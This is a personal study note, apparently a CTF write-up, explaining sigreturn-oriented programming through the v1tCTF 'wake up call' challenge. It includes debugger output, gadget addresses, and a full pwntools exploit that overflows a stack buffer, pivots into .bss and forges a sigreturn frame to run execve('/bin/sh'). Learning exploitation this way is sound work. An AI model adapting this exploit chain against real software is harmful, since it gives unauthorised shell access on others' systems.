---
title: "SROP (signal Return oriented programming) -"
date: 2026-07-21
description: "SROP (signal Return oriented programming) -"
tags: [pwn, theory, srop]
type: note
---

# SROP (signal Return oriented programming) - 

- it is type of binEX technique we use when we cant do std ret2libc and have gadgets like `pop rbp and pop rax but we dont have pop rdi`.
- we write our payloads using rop and create a fake frame which is loaded from userland and wtv the rsp is pointing to which the syscall to rt_sigret is made.

- i learnt this method using this ctf challenge : 

# wake call

```
Program received signal SIGSEGV, Segmentation fault.
0x000000000040122e in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 RAX  0
 RBX  0x7fffffffd8b8 ◂— 0x6361616161616164 ('daaaaaac')
 RCX  0x7ffff7eb5a91 (read+17) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x3e8
 RDI  0
 RSI  0x7fffffffd710 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x35
 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64
 R10  0x7fffffffd4b0 ◂— 0x800000
 R11  0x246
 R12  1
 R13  0
 R14  0x403dc0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x6161616161616171 ('qaaaaaaa')
 RSP  0x7fffffffd798 ◂— 0x6161616161616172 ('raaaaaaa')
 RIP  0x40122e (main+55) ◂— ret
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x40121b <main+36>    mov    rsi, rax
   0x40121e <main+39>    mov    edi, 0       EDI => 0
   0x401223 <main+44>    call   read@plt                    <read@plt>

   0x401228 <main+49>    mov    eax, 0       EAX => 0
   0x40122d <main+54>    leave
 ► 0x40122e <main+55>    ret                                <0x6161616161616172>
    ↓



───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd798 ◂— 0x6161616161616172 ('raaaaaaa')
01:0008│     0x7fffffffd7a0 ◂— 0x6161616161616173 ('saaaaaaa')
02:0010│     0x7fffffffd7a8 ◂— 0x6161616161616174 ('taaaaaaa')
03:0018│     0x7fffffffd7b0 ◂— 0x6161616161616175 ('uaaaaaaa')
04:0020│     0x7fffffffd7b8 ◂— 0x6161616161616176 ('vaaaaaaa')
05:0028│     0x7fffffffd7c0 ◂— 0x6161616161616177 ('waaaaaaa')
06:0030│     0x7fffffffd7c8 ◂— 0x6161616161616178 ('xaaaaaaa')
07:0038│     0x7fffffffd7d0 ◂— 0x6161616161616179 ('yaaaaaaa')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x40122e main+55
   1 0x6161616161616172 None
   2 0x6161616161616173 None
   3 0x6161616161616174 None
   4 0x6161616161616175 None
   5 0x6161616161616176 None
   6 0x6161616161616177 None
   7 0x6161616161616178 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 0x6161616161616171
Finding cyclic pattern of 8 bytes: b'qaaaaaaa' (hex: 0x7161616161616161)
Found at offset 128
```

- found the offset to rip at 136 bytes.

- this i had found in the ctf only but i got stuck afterwards



checksec details : 

```bash
base) ss@Satwik:/mnt/c/ctf_writeups/v1tCTF/UpsolivngBIN_for_better_understanding/wakeupcall$ checksec chall
[*] '/mnt/c/ctf_writeups/v1tCTF/UpsolivngBIN_for_better_understanding/wakeupcall/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(base) ss@Satwik:/mnt/c/ctf_writeups/v1tCTF/UpsolivngBIN_for_better_understanding/wakeupcall$
```


- Since the challenge says wake up call.

- after a lil bit of googling i learned it was SROP aka Sig ROP

# Now what is SROP? 

-  lets learn SROP from this chall's solution itself
  
- since we dont have `pop rdi`, we will not be able to do ret2libc

- what we have are 
- `4011ef:	58                   	pop    rax`
- `4011f1:	0f 05                	syscall`
- `0x40117d : pop rbp`
- `0x0000000000404020 - 0x0000000000404050 is .bss`
- ` 401212:	48 8d 45 80          	lea    rax,[rbp-0x80]`

### what is bss?
- it stores global vars and 

```py
from pwn import *

context.arch = 'amd64'

io = remote('chall.v1t.site', 30211)
io.sendlineafter(b"pond.\n", b"A"*136 + p64(0x40117d) + p64(0x404050+0x80)+ p64(0x401212))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404050
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x4011f1

io.sendline(b"/bin/sh\x00".ljust(8,b'\x00') + p64(0x0)*16 + p64(0x4011ef) + p64(0xf) + p64(0x4011f1) + bytes(frame))
io.interactive()
```
### First payload
- `io.sendlineafter(b"pond.\n", b"A"*136 + p64(0x40117d) + p64(0x404050+0x80)+ p64(0x401212))` : 
    - we can calculate the offset to $RIP very easily but using cyclic pattern.
    - So first part of our payload is just reaching the rip.
    - then we are overwriting the rip : `0x40117d : pop rbp` which pops rbp giving us rbp control
    - then we do : `p64(0x404050+0x80)` : which basically writes the `.bss + 0x80` into rbp. Why 0x80? see the next line 
    - next part : `p64(0x401212))` : this address contains ` 401212:	48 8d 45 80          	lea    rax,[rbp-0x80]` which basically stores `rbp - 0x80` into the rax which will compute to our .bss address basically and we are reading into `.bss` now 
### what exactly is going on ?

- with our first payload we are reading into the .bss\

### frame

```py
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404050
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x4011f1
```

#### When rt_sigreturn is invoked, the kernel:

Treats the userland memory at RSP as containing a ucontext_t whose embedded sigcontext holds saved register values.

Copies those saved register values into the proces s's CPU registers (RAX, RBX, RDI, RSI, RSP, RIP)

Restores signal mask and other state, and then returns to userland executing at the restored RIP.

**So the kernel will literally set RIP = frame.rip, RSP = frame.rsp , RAX = frame.rax, etc.**

- `frame.rax = 0x3b` - is the syscall no for execve which lets us pop a shell.


- `frame.rdi = 0x404050` - ` rdi` is the first argument to Linux syscalls on x86_64; execve's first argument is const char *filename. Setting `rdi = 0x404050` points to the string "/bin/sh\x00" you placed earlier at 0x404050 in .bss. That makes execve("/bin/sh", ...)


- ` frame.rsi = 0 and frame.rdx = 0`

  - rsi and rdx are argv and envp for execve. Setting them to 0 is a common minimal approach (NULL argv/env) — some programs require argv to be non-NULL, but execve("/bin/sh", 0, 0) commonly works to get a shell in many CTFs.

- `frame.rip = 0x4011f1`

- `rip` is where the kernel will resume execution after restoring registers. Here 0x4011f1 is the address of syscall; ret gadget in the binary. The plan is:

`Kernel returns to userland at rip = 0x4011f1`.

That syscall instruction executes immediately. Because rax has been restored to 59, the syscall instruction now performs execve("/bin/sh", 0, 0).

- with this we pop the shell.

### 2nd payload 

- `io.sendline(b"/bin/sh\x00".ljust(8,b'\x00') + p64(0x0)*16 + p64(0x4011ef) + p64(0xf) + p64(0x4011f1) + bytes(frame))`



-  `/bin/sh\x00`

   - This will be the char *filename argument for execve().

   - The frame.rdi later will be set to 0x404050, which points here.

   - Must be null terminated.

-  `p64(0x0) * 16 (128 bytes)`

   - Not random: it aligns everything so the gadget sequence and frame end up at predictable offsets.

      16 * 8 = 128 bytes = 0x80

      This matches what was earlier set using RBP pivoting (rbp = bss + 0x80)

If this padding changes, the sigreturn frame moves 

- `p64(0x4011ef)  gadget: pop rax ; ret`

  - First instruction run when we re-enter the chain.

  - It will pop the next 8 bytes into RAX → that will be 0xF (next part).

  After popping, RSP increases which important for frame alignment.

- `p64(0xf) (15)`

  - Syscall number for rt_sigreturn on x86_64.

    `When gadget executes: rax = 0xF.`

- `p64(0x4011f1)  gadget: syscall ; ret`

  - Executes syscall

    - Since rax = 0xf, kernel interprets as rt_sigreturn

     - Kernel then reads a ucontext struct from the memory at RSP

  - That struct is  the SigreturnFrame

  - After restoring registers, CPU resumes execution at frame.rip
